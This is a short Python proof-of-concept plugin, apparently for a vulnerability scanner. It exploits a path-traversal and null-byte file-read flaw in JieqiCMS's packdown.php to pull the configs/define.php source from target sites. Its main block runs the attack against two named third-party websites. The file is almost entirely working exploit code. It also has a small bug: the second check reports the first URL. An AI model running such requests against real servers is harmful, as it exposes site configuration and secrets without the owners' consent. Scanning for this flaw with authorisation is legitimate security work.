#!/usr/bin/env python
#coding:utf-8
#ref:http://www.wooyun.org/bugs/wooyun-2010-0144213

def assign(service, arg):
    if service == "jieqicms":
        return True, arg

def audit(arg):
    poc1 = arg+'modules/article/packdown.php?id=11764&cid=./../../../../../configs/define.php%00&type=txt&fname=define.php'
    poc2 = arg+'modules/article/packdown.php?id=360&cid=./../../../../../configs/define.php%00&type=txt&fname=define.php'
    code, head, res1, errcode, _ = curl.curl2(poc1)
    code, head, res2, errcode, _ = curl.curl2(poc2)
    if code == 200 and "<?php" in res1 and "lang_system.php" in res1:
        security_hole("jieqicms vulnerable:"+poc1)
    elif code == 200 and "<?php" in res2 and "lang_system.php" in res2:
        security_hole("jieqicms vulnerable:"+poc1)

if __name__ == '__main__':
    from dummy import *
    audit(assign('jieqicms', 'http://www.bayueju.com/')[1])
    audit(assign('jieqicms', 'http://www.txt56.com/')[1])